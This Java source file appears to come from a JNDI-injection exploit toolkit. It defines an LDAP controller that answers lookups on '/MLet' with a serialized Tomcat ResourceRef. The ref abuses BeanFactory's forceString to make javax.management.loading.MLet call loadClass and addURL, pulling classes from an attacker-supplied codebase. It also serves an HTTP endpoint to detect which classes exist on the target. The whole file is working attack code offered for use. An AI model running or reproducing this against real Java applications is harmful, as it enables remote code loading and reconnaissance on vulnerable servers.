package com.example.exploit.controller;

import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.server.FileHandler;
import com.example.exploit.server.WebServer;
import com.example.exploit.util.SerializeUtil;
import com.unboundid.ldap.sdk.Entry;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Hashtable;

@LdapController
@LdapMapping("/MLet")
public class MLetController {
    public void processResult(Hashtable<String, String> params, Entry e) throws Exception {
        String name = params.get("name");

        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", name));
        ref.add(new StringRefAddr("b", params.get("codebase")));
        ref.add(new StringRefAddr("c", name + "_exists"));

        WebServer.httpServer.createContext("/" + name.replace(".", "/") + "_exists.class", new FileHandler(null));

        System.out.println("[LDAP] Using MLet");
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", SerializeUtil.serialize(ref));
    }

    @LdapMapping("/{name}")
    public void mLet(Hashtable<String, String> params) {
        System.out.println("[LDAP] Try to detect class: " + params.get("name"));
    }
}
